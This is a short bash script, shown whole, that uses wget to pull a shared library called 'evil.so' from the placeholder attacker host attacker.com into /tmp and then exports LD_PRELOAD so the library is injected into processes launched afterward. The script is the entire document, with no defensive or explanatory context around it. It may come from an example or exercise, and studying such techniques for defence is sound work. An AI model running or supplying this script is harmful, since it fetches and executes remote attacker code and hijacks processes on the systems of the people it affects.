#!/bin/bash
wget -P /tmp/ http://attacker.com/evil.so
export LD_PRELOAD=/tmp/evil.so
